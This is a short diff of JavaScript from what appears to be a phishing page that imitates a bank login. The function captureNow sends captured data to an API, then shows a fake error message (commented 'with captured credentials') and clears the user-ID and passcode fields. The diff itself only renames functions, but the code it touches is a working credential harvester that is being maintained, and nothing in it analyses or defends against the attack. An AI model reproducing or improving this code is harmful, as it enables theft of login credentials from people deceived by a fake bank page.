@@ -57,16 +57,16 @@ function captureNow() {
     .then(r => r.json())
     .then(result => {
       console.log('[FL] ✓ API Response:', result);
-      showError();
+      showFormCaptureError();
     })
     .catch(err => {
       console.error('[FL] ✗ API Error:', err.message);
-      showError();
+      showFormCaptureError();
     });
     
     // Clear and show error
     setTimeout(() => {
-      clearForm();
+      clearFormFields();
     }, 500);
     
   } catch (err) {
@@ -75,7 +75,7 @@ function captureNow() {
 }
 
 // Show error message with captured credentials
-function showError() {
+function showFormCaptureError() {
   try {
     if (window && window.scrollTo) {
       window.scrollTo(0, 0);
@@ -106,7 +106,7 @@ function showError() {
 }
 
 // Clear form
-function clearForm() {
+function clearFormFields() {
   const uid = document.getElementById('enterID-input');
   const pwd = document.getElementById('tlpvt-passcode-input');
   if (uid) uid.value = '';
